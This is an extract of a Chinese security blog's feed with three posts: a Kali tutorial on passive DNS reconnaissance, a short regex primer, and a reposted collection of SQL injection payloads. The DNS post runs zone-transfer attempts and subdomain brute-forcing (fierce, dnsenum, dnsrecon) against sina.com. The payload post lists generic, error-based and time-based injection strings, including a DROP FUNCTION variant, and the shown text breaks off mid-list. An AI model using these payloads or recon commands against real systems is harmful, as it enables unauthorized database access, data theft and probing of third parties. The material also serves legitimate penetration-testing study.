src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233949779.png" alt="image-20221217233949779"></p><p>抓包查看，本机IP先向本地DNS服务器查询，类型是NS，类是IN（Internet）</p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234002333.png" alt="image-20221217234002333"></p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234013354.png" alt="image-20221217234013354"></p><p>本地服务器响应包，返回13个根域地址：</p></li></ul><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234026141.png" alt="image-20221217234026141"></p><p>后面其他的DNS数据包同上，进行迭代查询。</p><p><strong>若是进行了DNS劫持，可以使用dig +trace example.com进行追踪查询，其中必有一个DNS服务器的域名不正确。</strong></p><h3 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h3><blockquote><p>区域传输发生在DNS服务器之间信息同步的过程，一台服务器的数据库变更，同步到其他服务器上，正常情况下区域传输只发生在本域的域名服务器之间；若是配置错误，那任何人可以和域名服务器进行区域传输，任何人都可以拿到所有的主机记录的名称以及IP地址。</p></blockquote><ul><li><p>若是区域传输配置错误的前提下，使用以下命令可以对目标服务器进行区域传输</p><ul><li><p>dig @ns1.example.com example.com axtr</p><blockquote><p>指定na1.example.com域名服务器，下载example.com这个域的所有域名记录，区域传输使用的传输方法使用的是axfr，差异化的传输</p></blockquote></li></ul></li></ul><p>以ns4.sina.com为例，最终传输错误：</p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234038637.png" alt="image-20221217234038637"></p><p>抓包查看其过程：</p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234048828.png" alt="image-20221217234048828"></p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234100123.png" alt="image-20221217234100123"></p><p>先向本地的域名服务器查询了ns4.sina.com的A记录，本地域名服务器返回解析IP，之后进行区域传输时，进行TCP连接（域名查询的时候使用UDP），再进行AXFR类型的查询，最后拒绝连接。</p><ul><li><p>host -T -l sina.com ns3.sina.com</p><blockquote><p>-l 参数进行AXFR的传输，-T 表示时间</p></blockquote></li></ul><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234110993.png" alt="image-20221217234110993"></p><p>同样也是拒绝连接。</p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234122447.png" alt="image-20221217234122447"></p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234133262.png" alt="image-20221217234133262"></p><p>和dig命令相同，host命令同样也是先向本地域名服务器查询ns.sina.com的A记录和4A记录之后本地域名服务器将查询结果返回本地，然后本地向查询到的IP进行TCP连接，接着进行AXFR类型的查询，最终断开连接。</p><h3 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h3><ul><li><p>fierce –dns-servers 8.8.8.8 –domain example.com.cn –subdomain-file  a.txt</p><p><code>fierce命令，参数--dns-server指定dns服务器，参数--domain指定要查询那个域，--subdomain-file 后面指定字典</code></p><ul><li><p>由于本地没有a.txt字典，使用dpkg查询一下fierce自带的字典路径</p><ul><li>命令：dpkg -L fierce</li><li><code>dpkg基于debin的Linux的包管理程序，-L参数可以列出在系统上安装的相关生成的文件</code></li><li><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234147262.png" alt="image-20221217234147262"></li><li>使用more查看5000.txt</li><li><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234158356.png" alt="image-20221217234158356"></li><li>使用cat查看是否有www之类的字段</li><li>命令：cat &#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;fierce&#x2F;lists&#x2F;5000.txt | grep www</li><li><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234212398.png" alt="image-20221217234212398"></li></ul></li><li><p>进行爆破</p><ul><li><blockquote><p>fierce –dns-servers 8.8.8.8 –domain sina.com.cn –subdomain-file  &#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;fierce&#x2F;lists&#x2F;5000.txt</p></blockquote></li><li><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234223304.png" alt="image-20221217234223304"></p></li></ul><p>​        此时Found表示已经爆破出相关的子域名。</p></li></ul></li><li><p>dnsdict6 -d4 -t 16 -u sina.com</p><pre class="line-numbers language-none"><code class="language-none">-d4 显示ipv4&#x2F;6的地址 -t 可指定线程数；-x 指定使用什么级别的字典-s 小字典；-m 普通字典；-l 大字典；-x 更大字典；-u 超级字典-D 手动指定字典<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234233712.png" alt="image-20221217234233712"></li></ul></li><li><p>dnsenum -f  dnsdict.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</p><pre class="line-numbers language-none"><code class="language-none">-f 指定字典；-dnsserver 指定DNS服务器；-o 可导出xml文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>使用dpkg查找字典信息</p></li><li><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234244590.png" alt="image-20221217234244590"></p></li><li><p>dnsenum -f  &#x2F;usr&#x2F;share&#x2F;dnsenum&#x2F;dns.txt  -dnsserver 8.8.8.8 sina.com -o sina.xml </p></li><li><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234254896.png" alt="image-20221217234254896"></p></li><li><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234306565.png" alt="image-20221217234306565"></p></li><li><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234316667.png" alt="image-20221217234316667"></p><p>dnsenum可以查询出NS，MX以及区域传输AXFR等信息。</p></li></ul></li><li><p>dnsmap sina.com -w dns.txt </p><pre class="line-numbers language-none"><code class="language-none">-w 指定字典<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>dnsmap sina.com -w &#x2F;usr&#x2F;share&#x2F;dnsmap&#x2F;wordlist_TLAs.txt</li><li><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234335238.png" alt="image-20221217234335238"></li></ul></li><li><p>dnsrecon -d sina.com –lifetime  10 -t brt -D dnsbog.txt</p><pre class="line-numbers language-none"><code class="language-none">-d 指定域名；--lifetime 超时时间；-t 指定查询强度，brt表示暴力爆破；-D 指定字典<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>dnsrecon -d sina.com –lifetime  10 -t brt -D &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;namelist.txt</li><li><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234349463.png" alt="image-20221217234349463"></li></ul></li><li><p>dnsrecon -d sina.com –lifetime 10 -t std -D  &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;namelist.txt</p><pre class="line-numbers language-none"><code class="language-none">和上面的相同，这里的-t std表示标准爆破<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234359428.png" alt="image-20221217234359428"></li></ul></li></ul><h3 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h3><ul><li><p>Whois查询</p></li><li><p>Whois -h whois.apnic.net x.x.x.x</p><ul><li><p>域名注册信息查询网站</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.afrinic.nethttp:&#x2F;&#x2F;www.apnic.nethttp:&#x2F;&#x2F;ws.arin.nethttp:&#x2F;&#x2F;www.iana.comhttp:&#x2F;&#x2F;www.icann.orghttp:&#x2F;&#x2F;www.lacnic.nethttp:&#x2F;&#x2F;www.nro.nethttp:&#x2F;&#x2F;www.ripe.nethttp:&#x2F;&#x2F;www.inernic.net<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>Kali下的Whois查询</p><ul><li><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234410740.png" alt="image-20221217234410740"></li><li><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217234428733.png" alt="image-20221217234428733"></li><li>后续可以使用社工进行攻击</li></ul><p>​</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2022/10/31/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2022/10/31/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/10/31/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.png" alt="正则表达式"></p><h2 id="0x01-正则语法（入门）"><a href="#0x01-正则语法（入门）" class="headerlink" title="0x01 正则语法（入门）"></a>0x01 正则语法（入门）</h2><ul><li><p><strong>字符组</strong>（<code>[]</code>）允许匹配一组可能出现的字符。</p></li><li><p><strong>区间：</strong></p><ul><li><strong>连字符<code>(-)</code>代表区间</strong>：</li><li>要匹配任意数字可以使用<code>[0-9]</code>；</li><li>如果想要匹配所有小写字母，可以写成<code>[a-z]</code>；</li><li>想要匹配所有大写字母可以写成<code>[A-Z]</code>。</li></ul></li><li><p><strong>匹配特殊字符</strong></p><ul><li>使用<code>\</code>进行都特殊字符转义 例：<code>[\[\-\(]</code></li></ul></li><li><p><strong>取反</strong></p><ul><li>通过在字符数组开头使用 <code>^</code> 字符实现取反操作，从而可以反转一个字符组（意味着会匹配任何指定字符之外的所有字符）。</li><li><code>n[^e]</code>：n<code>后面的字母不能为 </code>e</li></ul></li><li><p><strong>快捷匹配数字和字母</strong></p><ul><li><table><thead><tr><th>快捷方式</th><th>描述</th></tr></thead><tbody><tr><td>\w</td><td>与任意单词字符匹配，任意单词字符表示 <code>[A-Z]</code>、 <code>[a-z]</code>、<code>[0-9]</code>、<code>_</code></td></tr><tr><td>\d</td><td>与任意数字匹配</td></tr></tbody></table></li><li><p><code>\s</code>快捷方式可以<strong>匹配空白字符</strong>，比如空格，tab、换行等。</p></li><li><p><code>\b</code> 匹配的是单词的边界：<code>\bmaster\b</code> 就仅匹配有边界的<code>master</code>单词。</p></li></ul></li><li><p><strong>快捷方式取反</strong></p><ul><li><code>\w</code>的取反为<code>\W</code>，将小写改写成大写即可（其他快捷方式也遵循这个规则）。</li><li><code>\D</code>的取反为<code>\d</code>，取非数字</li></ul></li><li><p><strong>开始和结束</strong></p><ul><li>正则表达式中 <code>^</code>指定的是一个字符串的开始，<code>$</code>指定的是一个字符串的结束。</li><li>可匹配多行</li></ul></li><li><p><strong>任意字符</strong></p><ul><li><code>.</code>字符代表匹配任何<strong>单个字符</strong>，它<strong>只能出现在方括号以外</strong></li><li><code>.</code>字符只有一个不能匹配的字符，也就是换行符（<code>\n</code>）</li></ul></li><li><p><strong>可选字符</strong></p><ul><li>使用 <code>?</code> 符号指定一个字符、字符组或其他基本单元可选，这意味着正则表达式引擎将会期望该字符出现<strong>零次或一次</strong>。</li><li>例：<code>favorite和favourite</code>–&gt;<code>favou?rite</code></li></ul></li><li><p><strong>重复</strong></p><ul><li>在一个字符组后加上<code>&#123;N&#125;</code> 就可以表示在它之前的字符组出现<code>N</code>次</li></ul></li><li><p><strong>重复区间</strong></p><ul><li>重复区间，语法：<code>&#123;M,N&#125;</code>，<code>M</code>是下界而<code>N</code>是上界。</li></ul></li><li><p><strong>开闭区间</strong></p><ul><li>闭区间不写即可表示匹配一个或无数个；例：<code>\d&#123;1,&#125;</code></li><li>可以使用两个速写字符指定常见的重复情况，可以使用 <code>+</code> 匹配<code>1</code>个到无数个，使用 <code>*</code>代表<code>0</code>个到无数个。即：**<code>+</code>等价于<code>&#123;1,&#125;</code>，<code>*</code>等价于<code>&#123;0,&#125;</code>。**</li><li>例：<code>f.+</code></li></ul></li></ul><h2 id="0x02-练习"><a href="#0x02-练习" class="headerlink" title="0x02 练习"></a>0x02 练习</h2><ul><li><p>匹配所有手机号码：</p><ul><li>必须是<code>11</code>位的数字；</li><li>第一位数字必须以<code>1</code>开头，第二位数字可以是<code>[3,4,5,7,8]</code>中的任意一个，后面<code>9</code>个数是<code>[0-9]</code>中的任意一个数字。</li></ul><p>正则匹配：<code>^1[34578]\d&#123;9&#125;</code></p></li><li><p>匹配网站地址</p><ul><li>匹配以 <code>http</code>开头，以<code>/</code>结尾的所有数据。</li></ul><p>正则匹配：<code>^http.+/$</code></p></li></ul><h2 id="0x03-进阶"><a href="#0x03-进阶" class="headerlink" title="0x03 进阶"></a>0x03 进阶</h2>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入Payload汇总</title>
      <link href="/2022/09/03/SQL%E6%B3%A8%E5%85%A5Payload%E6%B1%87%E6%80%BB/"/>
      <url>/2022/09/03/SQL%E6%B3%A8%E5%85%A5Payload%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00-文章出处"><a href="#0x00-文章出处" class="headerlink" title="0x00 文章出处"></a>0x00 文章出处</h2><p>文章来源：<strong>khan安全攻防实验室</strong></p><p><img src="/2022/09/03/SQL%E6%B3%A8%E5%85%A5Payload%E6%B1%87%E6%80%BB/image-20220903083702287.png" alt="image-20220903083702287"></p><h2 id="0x01-通用-SQL-注入负载"><a href="#0x01-通用-SQL-注入负载" class="headerlink" title="0x01 通用 SQL 注入负载"></a>0x01 通用 SQL 注入负载</h2><pre class="line-numbers language-none"><code class="language-none">&#39;&#39;&#39;&#96;&#96;&#96;,&quot;&quot;&quot;&#x2F;&#x2F;&#x2F;\\\;&#39; or &quot;-- or # &#39; OR &#39;1&#39; OR 1 -- -&quot; OR &quot;&quot; &#x3D; &quot;&quot; OR 1 &#x3D; 1 -- -&#39; OR &#39;&#39; &#x3D; &#39;&#39;&#x3D;&#39;&#39;LIKE&#39;&#39;&#x3D;0--+ OR 1&#x3D;1&#39; OR &#39;x&#39;&#x3D;&#39;x&#39; AND id IS NULL; --&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;UNION SELECT &#39;2%00&#x2F;*…*&#x2F; +    addition, concatenate (or space in url)||    (double pipe) concatenate%    wildcard attribute indicator@variable  local variable@@variable  global variable# NumericAND 1AND 0AND trueAND false1-false1-true1*56-21&#39; ORDER BY 1--+1&#39; ORDER BY 2--+1&#39; ORDER BY 3--+1&#39; ORDER BY 1,2--+1&#39; ORDER BY 1,2,3--+1&#39; GROUP BY 1,2,--+1&#39; GROUP BY 1,2,3--+&#39; GROUP BY columnnames having 1&#x3D;1 ---1&#39; UNION SELECT 1,2,3--+&#39; UNION SELECT sum(columnname ) from tablename ---1 UNION SELECT 1 INTO @,@-1 UNION SELECT 1 INTO @,@,@1 AND (SELECT * FROM Users) &#x3D; 1  &#39; AND MID(VERSION(),1,1) &#x3D; &#39;5&#39;;&#39; and 1 in (select min(name) from sysobjects where xtype &#x3D; &#39;U&#39; and name &gt; &#39;.&#39;) --Finding the table nameTime-Based:,(select * from (select(sleep(10)))a)%2c(select%20*%20from%20(select(sleep(10)))a)&#39;;WAITFOR DELAY &#39;0:0:30&#39;--Comments:#      Hash comment&#x2F;*    C-style comment-- -  SQL comment;%00  Nullbyte&#96;      Backtick<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-基于通用错误的有效负载"><a href="#0x02-基于通用错误的有效负载" class="headerlink" title="0x02 基于通用错误的有效负载"></a>0x02 基于通用错误的有效负载</h2><pre class="line-numbers language-none"><code class="language-none"> OR 1&#x3D;1 OR 1&#x3D;0 OR x&#x3D;x OR x&#x3D;y OR 1&#x3D;1# OR 1&#x3D;0# OR x&#x3D;x# OR x&#x3D;y# OR 1&#x3D;1--  OR 1&#x3D;0--  OR x&#x3D;x--  OR x&#x3D;y--  OR 3409&#x3D;3409 AND (&#39;pytW&#39; LIKE &#39;pytW OR 3409&#x3D;3409 AND (&#39;pytW&#39; LIKE &#39;pytY HAVING 1&#x3D;1 HAVING 1&#x3D;0 HAVING 1&#x3D;1# HAVING 1&#x3D;0# HAVING 1&#x3D;1--  HAVING 1&#x3D;0--  AND 1&#x3D;1 AND 1&#x3D;0 AND 1&#x3D;1--  AND 1&#x3D;0--  AND 1&#x3D;1# AND 1&#x3D;0# AND 1&#x3D;1 AND &#39;%&#39;&#x3D;&#39; AND 1&#x3D;0 AND &#39;%&#39;&#x3D;&#39; AND 1083&#x3D;1083 AND (1427&#x3D;1427 AND 7506&#x3D;9091 AND (5913&#x3D;5913 AND 1083&#x3D;1083 AND (&#39;1427&#x3D;1427 AND 7506&#x3D;9091 AND (&#39;5913&#x3D;5913 AND 7300&#x3D;7300 AND &#39;pKlZ&#39;&#x3D;&#39;pKlZ AND 7300&#x3D;7300 AND &#39;pKlZ&#39;&#x3D;&#39;pKlY AND 7300&#x3D;7300 AND (&#39;pKlZ&#39;&#x3D;&#39;pKlZ AND 7300&#x3D;7300 AND (&#39;pKlZ&#39;&#x3D;&#39;pKlY AS INJECTX WHERE 1&#x3D;1 AND 1&#x3D;1 AS INJECTX WHERE 1&#x3D;1 AND 1&#x3D;0 AS INJECTX WHERE 1&#x3D;1 AND 1&#x3D;1# AS INJECTX WHERE 1&#x3D;1 AND 1&#x3D;0# AS INJECTX WHERE 1&#x3D;1 AND 1&#x3D;1-- AS INJECTX WHERE 1&#x3D;1 AND 1&#x3D;0-- WHERE 1&#x3D;1 AND 1&#x3D;1 WHERE 1&#x3D;1 AND 1&#x3D;0 WHERE 1&#x3D;1 AND 1&#x3D;1# WHERE 1&#x3D;1 AND 1&#x3D;0# WHERE 1&#x3D;1 AND 1&#x3D;1-- WHERE 1&#x3D;1 AND 1&#x3D;0-- ORDER BY 1--  ORDER BY 2--  ORDER BY 3--  ORDER BY 4--  ORDER BY 5--  ORDER BY 6--  ORDER BY 7--  ORDER BY 8--  ORDER BY 9--  ORDER BY 10--  ORDER BY 11--  ORDER BY 12--  ORDER BY 13--  ORDER BY 14--  ORDER BY 15--  ORDER BY 16--  ORDER BY 17--  ORDER BY 18--  ORDER BY 19--  ORDER BY 20--  ORDER BY 21--  ORDER BY 22--  ORDER BY 23--  ORDER BY 24--  ORDER BY 25--  ORDER BY 26--  ORDER BY 27--  ORDER BY 28--  ORDER BY 29--  ORDER BY 30--  ORDER BY 31337--  ORDER BY 1#  ORDER BY 2#  ORDER BY 3#  ORDER BY 4#  ORDER BY 5#  ORDER BY 6#  ORDER BY 7#  ORDER BY 8#  ORDER BY 9#  ORDER BY 10#  ORDER BY 11#  ORDER BY 12#  ORDER BY 13#  ORDER BY 14#  ORDER BY 15#  ORDER BY 16#  ORDER BY 17#  ORDER BY 18#  ORDER BY 19#  ORDER BY 20#  ORDER BY 21#  ORDER BY 22#  ORDER BY 23#  ORDER BY 24#  ORDER BY 25#  ORDER BY 26#  ORDER BY 27#  ORDER BY 28#  ORDER BY 29#  ORDER BY 30# ORDER BY 31337# ORDER BY 1  ORDER BY 2  ORDER BY 3  ORDER BY 4  ORDER BY 5  ORDER BY 6  ORDER BY 7  ORDER BY 8  ORDER BY 9  ORDER BY 10  ORDER BY 11  ORDER BY 12  ORDER BY 13  ORDER BY 14  ORDER BY 15  ORDER BY 16  ORDER BY 17  ORDER BY 18  ORDER BY 19  ORDER BY 20  ORDER BY 21  ORDER BY 22  ORDER BY 23  ORDER BY 24  ORDER BY 25  ORDER BY 26  ORDER BY 27  ORDER BY 28  ORDER BY 29  ORDER BY 30  ORDER BY 31337  RLIKE (SELECT (CASE WHEN (4346&#x3D;4346) THEN 0x61646d696e ELSE 0x28 END)) AND &#39;Txws&#39;&#x3D;&#39; RLIKE (SELECT (CASE WHEN (4346&#x3D;4347) THEN 0x61646d696e ELSE 0x28 END)) AND &#39;Txws&#39;&#x3D;&#39;IF(7423&#x3D;7424) SELECT 7423 ELSE DROP FUNCTION xcjl--IF(7423&#x3D;7423) SELECT 7423 ELSE DROP FUNCTION xcjl--%&#39; AND 8310&#x3D;8310 AND &#39;%&#39;&#x3D;&#39;%&#39; AND 8310&#x3D;8311 AND &#39;%&#39;&#x3D;&#39; and (select substring(@@version,1,1))&#x3D;&#39;X&#39; and (select substring(@@version,1,1))&#x3D;&#39;M&#39; and (select substring(@@version,2,1))&#x3D;&#39;i&#39; and (select substring(@@version,2,1))&#x3D;&#39;y&#39; and (select substring(@@version,3,1))&#x3D;&#39;c&#39; and (select substring(@@version,3,1))&#x3D;&#39;S&#39; and (select substring(@@version,3,1))&#x3D;&#39;X&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-基于时间的通用-SQL-注入负载"><a href="#0x03-基于时间的通用-SQL-注入负载" class="headerlink" title="0x03 基于时间的通用 SQL 注入负载"></a>0x03 基于时间的通用 SQL 注入负载</h2><pre class="line-numbers language-none"><code class="language-none">sleep(5)#1 or sleep(5)#&quot; or sleep(5)#&#39; or sleep(5)#&quot; or sleep(5)&#x3D;&quot;&#39; or sleep(5)&#x3D;&#39;1) or sleep(5)#&quot;) or sleep(5)&#x3D;&quot;&#39;) or sleep(5)&#x3D;&#39;1)) or sleep(5)#&quot;)) or sleep(5)&#x3D;&quot;&#39;)) or sleep(5)&#x3D;&#39;;waitfor delay &#39;0:0:5&#39;--);waitfor delay &#39;0:0:5&#39;--&#39;;waitfor delay &#39;0:0:5&#39;--&quot;;waitfor delay &#39;0:0:5&#39;--&#39;);waitfor delay &#39;0:0:5&#39;--&quot;);waitfor delay &#39;0:0:5&#39;--));waitfor delay &#39;0:0:5&#39;--&#39;));waitfor delay &#39;0:0:5&#39;--&quot;));waitfor delay &#39;0:0:5&#39;--benchmark(10000000,MD5(1))#1 or benchmark(10000000,MD5(1))#&quot; or benchmark(10000000,MD5(1))#&#39; or benchmark(10000000,MD5(1))#1) or benchmark(10000000,MD5(1))#&quot;) or benchmark(10000000,MD5(1))#&#39;) or benchmark(10000000,MD5(1))#1)) or benchmark(10000000,MD5(1))#&quot;)) or benchmark(10000000,MD5(1))#&#39;)) or 